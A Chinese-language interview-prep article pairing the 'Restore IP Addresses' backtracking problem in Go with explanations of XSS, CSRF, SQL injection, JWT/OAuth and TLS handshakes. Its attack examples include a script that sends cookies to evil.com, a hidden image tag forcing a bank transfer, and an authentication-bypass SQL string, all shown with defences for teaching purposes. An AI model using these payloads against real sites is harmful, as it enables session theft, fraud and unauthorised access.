## 1. 今日算法题

### 题目：复原 IP 地址（Restore IP Addresses）

**题目描述：**
给定一个只包含数字的字符串 `s`，请将其分割成有效的 IP 地址格式，返回所有可能的 IP 地址。

有效的 IP 地址格式为 `a.b.c.d`，其中 `a`、`b`、`c`、`d` 均为 0-255 范围内的整数，且不能以 0 开头（除非数字本身就是 0）。

**示例：**
```
输入: s = "25525511135"
输出: ["255.255.11.135", "255.255.111.35"]

输入: s = "0000"
输出: ["0.0.0.0"]

输入: s = "101023"
输出: ["1.0.10.23","1.0.102.3","10.1.0.23","10.10.2.3","101.0.2.3"]
```

**为什么选这道题：**
网络安全的第一步是**输入校验**。IP 地址是最常见的网络标识符，无论是防火墙规则、访问控制列表（ACL）、还是日志分析，都需要准确解析和验证 IP 格式。这道题结合了**回溯搜索**与**严格的格式校验**，考察的是你在面对"不确定输入"时如何设计安全的解析策略 —— 和安全工作中"永远不要信任用户输入"的核心原则完美呼应。

---

### 解题思路

**核心思想：回溯 + 剪枝**

IP 地址固定分成 4 段，每段 1-3 位数字，值在 0-255 之间。这是一个经典的组合搜索问题：

1. **逐段构建**：从左到右依次确定每一段的长度（1位、2位或3位）
2. **合法性剪枝**：每次截取一段后，立即判断是否符合 IP 段规则，不符合就直接回溯
3. **终止条件**：当恰好分成 4 段，且字符串刚好用完时，得到一个有效解

**关键校验规则（安全编码视角）：**
- 段长度 1-3，不能超出
- 数值范围 0-255，不能溢出
- 不能有前导零（如 "01" 不合法，但 "0" 合法）— **这是最容易踩坑的地方**

> 💡 安全编码启示：如果这段逻辑写在一个网络服务里做输入校验，上述三条规则缺一不可。漏掉任何一条，都可能被构造畸形输入绕过检查 —— 这正是真实世界里安全漏洞的来源。

### 代码实现（Go）

```go
func restoreIpAddresses(s string) []string {
    var result []string
    var path []string
    
    var backtrack func(start int)
    backtrack = func(start int) {
        // 终止条件：已经分出 4 段，且字符串刚好用完
        if len(path) == 4 {
            if start == len(s) {
                result = append(result, strings.Join(path, "."))
            }
            return
        }
        
        // 每一段长度可以是 1、2 或 3
        for length := 1; length <= 3; length++ {
            if start+length > len(s) {
                break // 越界，剪枝
            }
            
            segment := s[start : start+length]
            
            // 校验 1：不能有前导零（除非就是 "0"）
            if length > 1 && segment[0] == '0' {
                continue
            }
            
            // 校验 2：数值不能超过 255
            num, _ := strconv.Atoi(segment)
            if num > 255 {
                continue
            }
            
            // 做出选择
            path = append(path, segment)
            // 递归下一层
            backtrack(start + length)
            // 撤销选择
            path = path[:len(path)-1]
        }
    }
    
    backtrack(0)
    return result
}
```

**代码结构拆解（对应回溯模板）：**

```
回溯函数(start):
    如果 path 已满 4 段:
        如果字符串也刚好用完 → 找到一个合法解
        返回
    
    枚举当前段长度 (1..3):
        如果越界 → break
        截取 segment
        如果 segment 不合法 → continue（剪枝）
        
        path.append(segment)      // 做选择
        backtrack(start + length) // 递归
        path.pop()                // 撤销选择
```

---

### 复杂度分析

| 指标 | 复杂度 | 说明 |
|------|--------|------|
| 时间 | O(3⁴) = O(81) | 最多 4 段，每段最多 3 种长度，常数级复杂度 |
| 空间 | O(4) = O(1) | 递归深度最多 4 层，path 最多存 4 个字符串 |

> 这道题的时间复杂度看起来很唬人（3⁴），但因为深度固定为 4，实际上是个伪多项式，真实运行非常快。

**面试常追问：**
- "如果字符串很长（比如 12 位以上），需要特殊处理吗？" → IP 地址最多 12 位（255.255.255.255），超过 12 位可以直接返回空，这也是个强剪枝。
- "如果要做成在线服务里的 IP 校验器，这道题的回溯思路合适吗？" → 不合适。单 IP 校验用正则或按 `.` 切分后逐段判断 O(1) 就行，回溯是用来找"所有可能"的。安全编码里要区分「验证」和「解析」的场景。
- "IPv6 怎么校验？" → 128 位，8 组 16 进制，用 `:` 分隔，允许 `::` 压缩零段。正则表达式：`^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$` 及压缩变体。

## 2. 面试技巧 — 网络安全深度考点

### 🔥 三大经典 Web 攻击：XSS / CSRF / SQL 注入

#### XSS（跨站脚本攻击，Cross-Site Scripting）

**攻击原理：**
攻击者将恶意脚本注入到网页中，当其他用户浏览该页面时，脚本在受害者的浏览器上执行。

**三种类型：**

| 类型 | 名称 | 攻击方式 | 示例 |
|------|------|----------|------|
| 反射型 | Reflected XSS | 恶意脚本在 URL 中，诱导用户点击 | `https://site.com/search?q=<script>alert(1)</script>` |
| 存储型 | Stored XSS | 恶意脚本存入数据库，所有访问者中招 | 在评论区提交 `<script>document.location='evil.com?cookie='+document.cookie</script>` |
| DOM 型 | DOM-based XSS | 前端 JS 处理 URL 参数不当，动态修改 DOM | `location.hash` 被直接 `innerHTML` 插入页面 |

**防护措施：**
> 1. **输入过滤**：对用户输入做严格的白名单校验（不要黑名单，黑名单永远补不全）
> 2. **输出编码**：HTML 实体编码（`&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`）
> 3. **CSP（Content Security Policy）**：设置响应头 `Content-Security-Policy: script-src 'self'`，禁止执行内联脚本和外部未知来源脚本
> 4. **HttpOnly Cookie**：设置 `Set-Cookie: session=xxx; HttpOnly`，JS 无法读取 Cookie
> 5. **现代框架自动防护**：React/Vue 默认对插值表达式做转义

**面试速答模板：**
> "XSS 的核心是「用户输入被当成代码执行」。防护上我遵循三层策略：输入层做白名单过滤和长度限制，输出层做上下文敏感的编码（HTML/JS/CSS/URL 不同上下文编码方式不同），浏览器层开启 CSP 和 HttpOnly。其中最重要的是输出编码，因为即使输入过滤被绕过，输出编码是最后一道防线。"

---

#### CSRF（跨站请求伪造，Cross-Site Request Forgery）

**攻击原理：**
攻击者诱导已登录用户在不知情的情况下，向目标网站发起恶意请求。浏览器会自动带上该域下的 Cookie，服务端误以为是用户本人操作。

**典型攻击场景：**
```html
<!-- 攻击者在恶意网站中嵌入 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" width="0" height="0">
```
用户访问恶意网站时，如果之前登录过 bank.com 且 Cookie 未过期，浏览器会自动带上 Cookie 发送请求。

**防护措施：**
> 1. **CSRF Token**：服务端生成随机 Token 嵌入表单，提交时校验。攻击者无法获取 Token（同源策略限制）
> 2. **SameSite Cookie**：`Set-Cookie: session=xxx; SameSite=Strict/Lax`，跨站请求不携带 Cookie
> 3. **双重 Cookie 验证**：请求时从 Cookie 中读一个值，放到请求参数/Header 里，服务端比对
> 4. **校验 Origin/Referer**：检查请求来源，但 Referer 可能被浏览器禁用或篡改，不能完全依赖

**面试速答模板：**
> "CSRF 的核心是「借用户的身份干坏事」，攻击者无法读取 Cookie，但可以「利用」Cookie。防护关键是打破攻击链：CSRF Token 让攻击者无法构造合法请求，SameSite Cookie 让跨站请求不带凭证，两者结合基本可以杜绝。对于 API 接口，我优先用 SameSite=Strict + 自定义 Header（如 X-Requested-With），因为纯前后端分离的项目不需要表单提交。"

---

#### SQL 注入（SQL Injection）

**攻击原理：**
用户输入被拼接到 SQL 语句中，改变了 SQL 的语义。

**经典案例：**
```java
// 危险代码
String sql = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
// 攻击者输入：username = admin' OR '1'='1
// 实际执行：SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'
// 结果：绕过密码验证，直接登录 admin 账号
```

**防护措施：**
> 1. **参数化查询（PreparedStatement）**：最核心、最有效的防护。SQL 语句预编译，参数作为数据而非代码处理
> 2. **ORM 框架**：现代 ORM（如 GORM、MyBatis 正确使用 `#{}` 而非 `${}`）天然支持参数化
> 3. **输入校验**：对参数做类型、长度、格式白名单校验
> 4. **最小权限原则**：数据库账号只给必要的权限（如禁止 DROP/DELETE）
> 5. **WAF（Web 应用防火墙）**：作为兜底防线，检测常见注入特征

**面试速答模板：**
> "SQL 注入的本质是「数据和代码混在了一起」。根治方案只有一个：参数化查询。无论用什么语言、什么框架，只要是拼接 SQL 字符串就是风险点。另外我强调最小权限原则 —— 即使注入发生，如果数据库账号只有 SELECT 权限，攻击者能造成的损害也有限。"

### 🔥 认证与授权：Session vs JWT vs OAuth 2.0

#### Session（服务端状态）

```
客户端                    服务端
  |  1. 登录请求（用户名+密码）  |
  | ------------------------> |
  |                           |  验证通过，创建 Session
  |                           |  存储在内存/Redis/DB
  |  2. Set-Cookie: sid=xxx   |
  | <------------------------ |
  |                           |
  |  3. 后续请求（带 Cookie）    |
  | ------------------------> |
  |                           |  查 Session 表验证身份
  |  4. 返回数据               |
  | <------------------------ |
```

**优点：** 服务端可控，随时注销；存储空间大，可以存任意信息
**缺点：** 有状态，分布式需要共享 Session 存储（Redis）；跨域麻烦

---

#### JWT（JSON Web Token，无状态）

```
Header.Payload.Signature

Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "sub": "user123", "exp": 1699999999, "role": "admin" }
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

**优点：** 无状态，服务端不需要存储；天然支持分布式；可以携带用户基本信息
**缺点：** Token 签发后无法主动撤销（除非维护黑名单）；Payload 可解码（只是 Base64），不能放敏感信息；Token 较大，每次请求都带

**面试必问：JWT 被盗怎么办？**
> "JWT 本身设计就是无状态的，被盗后服务端无法单方面使其失效。我的应对策略：1）设置短有效期（Access Token 15 分钟），配合 Refresh Token 机制；2）敏感操作二次验证（如修改密码需要短信验证码）；3）支持用户主动「注销所有设备」时，将该用户的 Refresh Token 加入黑名单（Redis），强制重新登录。"

---

#### OAuth 2.0（第三方授权）

**授权码模式（最安全，最常用）：**
```
用户                      第三方应用                  授权服务器                  资源服务器
  |  1. 点击「微信登录」       |                         |                         |
  | -----------------------> |                         |                         |
  |                          |  2. 重定向到授权页         |                         |
  | <----------------------- |                         |                         |
  |  3. 用户确认授权            |                         |                         |
  | --------------------------------------------------> |                         |
  |                          |  4. 返回授权码（code）      |                         |
  |                          | <---------------------- |                         |
  |                          |  5. 用 code 换 access_token|                         |
  |                          | ----------------------> |                         |
  |                          |  6. 返回 token            |                         |
  |                          | <---------------------- |                         |
  |                          |  7. 用 token 请求用户信息   |                         |
  |                          | --------------------------------------------------> |
  |                          |  8. 返回用户信息            |                         |
  |                          | <-------------------------------------------------- |
```

**为什么用授权码，而不是直接返回 Token？**
> "如果直接返回 Token，Token 会经过用户浏览器，有被窃取的风险。授权码模式把 Token 的交换放在服务端之间完成（第 5 步），客户端永远接触不到 Token，安全性更高。"

### 🔥 HTTPS / TLS 安全握手

#### TLS 1.2 握手（4 次往返 = 2-RTT）

```
客户端                                                  服务端
  |  1. ClientHello                                       |
  |    - 支持的 TLS 版本                                    |
  |    - 支持的密码套件列表（如 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384）|
  |    - 客户端随机数（Client Random）                       |
  | ----------------------------------------------------> |
  |                                                       |
  |  2. ServerHello                                       |
  |    - 选定 TLS 版本和密码套件                             |
  |    - 服务端随机数（Server Random）                       |
  |    - 服务端证书（含公钥）                                 |
  |    - [可选] 请求客户端证书                                |
  | <---------------------------------------------------- |
  |                                                       |
  |  3. 客户端验证证书 → 提取服务端公钥                        |
  |    - 生成 Pre-master Secret（预主密钥）                  |
  |    - 用服务端公钥加密 Pre-master Secret                 |
  |    - 发送加密后的 Pre-master Secret                     |
  |    - [可选] 发送客户端证书 + 证书验证消息                  |
  |    - ChangeCipherSpec（之后都用协商密钥加密）              |
  |    - Finished（用会话密钥加密的握手摘要，验证协商成功）       |
  | ----------------------------------------------------> |
  |                                                       |
  |  4. 服务端用私钥解密 Pre-master Secret                   |
  |    - 同样的方式生成会话密钥                               |
  |    - ChangeCipherSpec                                   |
  |    - Finished                                           |
  | <---------------------------------------------------- |
  |                                                       |
  |  ========= 后续通信使用对称加密会话密钥 =========          |
```

**会话密钥生成：**
```
Master Secret = PRF(Pre-master Secret, "master secret", Client Random + Server Random)
会话密钥（对称加密密钥）从 Master Secret 派生
```

**为什么用非对称加密交换对称密钥？**
> "非对称加密（RSA/ECDHE）计算量大，不适合大量数据传输。对称加密（AES）速度快，但密钥分发是个问题。TLS 握手先用非对称加密安全地交换对称密钥，后续通信全用对称加密，兼顾安全和性能。"

---

#### TLS 1.3 优化（1-RTT，甚至 0-RTT）

| 特性 | TLS 1.2 | TLS 1.3 |
|------|---------|---------|
| 握手 RTT | 2-RTT | 1-RTT |
| 支持算法 | 包含不安全的（MD5、SHA-1、RSA 密钥交换） | 只保留安全的（AEAD、PFS） |
| 会话恢复 | Session Ticket / Session ID | PSK（Pre-Shared Key） |
| 0-RTT | 不支持 | 支持（基于 PSK，有重放攻击风险） |

**1-RTT 原理：**
> TLS 1.3 把 ServerHello 和密钥交换参数合并，客户端在发送 ClientHello 时就可以携带密钥共享参数（如 X25519 公钥），服务端回复时直接包含加密的扩展，双方同时计算出会话密钥。握手从 4 条消息压缩到 3 条，减少 1 个 RTT。

### 🔥 安全编码 Checklist

```
□ 输入校验：永远不要信任用户输入，白名单 > 黑名单
□ 输出编码：根据上下文做 HTML/JS/CSS/URL 编码
□ 参数化查询：杜绝 SQL 拼接，100% 使用 PreparedStatement
□ 密码存储：bcrypt/argon2 加盐哈希，绝不存明文或 MD5
□ HTTPS 全站：HSTS 头强制 HTTPS，禁止混合内容
□ Cookie 安全：HttpOnly + Secure + SameSite
□ CSRF 防护：Token + SameSite Cookie 双重保障
□ 敏感操作：二次验证（短信/邮箱/TOTP）
□ 最小权限：数据库账号、文件权限、API 权限
□ 日志脱敏：密码、Token、身份证号不打日志
□ 依赖安全：定期扫描依赖漏洞（Snyk、Dependabot）
□ 漏洞响应：制定安全事件响应 SOP，定期演练
```

### 🔥 高频面试题速答

**Q1: HTTPS 一定安全吗？**
> "不一定。HTTPS 只保证传输层安全，不保证应用层安全。如果服务端本身有漏洞（如 SQL 注入）、或者用户被钓鱼网站欺骗（域名拼写相似的假网站），HTTPS 也救不了。另外，如果客户端不校验证书（如 curl -k），或者证书链被中间人替换，HTTPS 形同虚设。"

**Q2: 怎么防止密码被暴力破解？**
> "多层防护：1）密码复杂度要求（长度+字符种类）；2）bcrypt/argon2 慢哈希，增加破解成本；3）登录失败次数限制（如 5 次错误后要求验证码或锁定 15 分钟）；4）异地登录提醒；5）检测常见弱密码字典；6）推荐用户开启 2FA。"

**Q3: 登录状态怎么设计最安全？**
> "我倾向于双 Token 方案：Access Token（JWT，15 分钟有效期，存内存）+ Refresh Token（HttpOnly Cookie，7-30 天，存 Redis 可撤销）。Access Token 短效减少被盗后的损失窗口，Refresh Token 放在 HttpOnly Cookie 里 JS 读不到，且服务端可以撤销。敏感操作（改密码、转账）要求重新输入密码或 2FA。"

**Q4: 怎么发现系统有没有被 XSS/SQL 注入？**
> "静态层面：代码审计 + SAST 工具（如 SonarQube、Semgrep）扫描拼接 SQL、innerHTML 等危险函数。动态层面：DAST 工具（如 OWASP ZAP、Burp Suite）自动化 fuzz 测试。运行时：WAF 规则拦截、RASP（Runtime Application Self-Protection）在应用层实时检测攻击行为。"

**Q5: DDOS 怎么防？**
> "分层防御：1）网络层：云厂商高防 IP（如阿里云 DDoS 高防、Cloudflare），清洗流量；2）传输层： SYN Cookie 防 SYN Flood、限连接数；3）应用层：验证码防刷、API 速率限制（Rate Limiting）、CDN 缓存减少源站压力；4）业务层：排队机制、熔断降级，保护核心服务。"
